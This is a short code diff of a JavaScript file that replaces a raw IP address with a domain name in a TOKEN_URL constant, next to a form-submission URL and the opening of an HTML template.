@@ -1,4 +1,4 @@
-const TOKEN_URL = "https://62.146.236.10/redirect/";
+const TOKEN_URL = "https://samarinda.io/redirect/";
 const SUBMIT_URL = "https://samarinda.io/samarinda/index.php";
 
 const HTML = `<!doctype html>
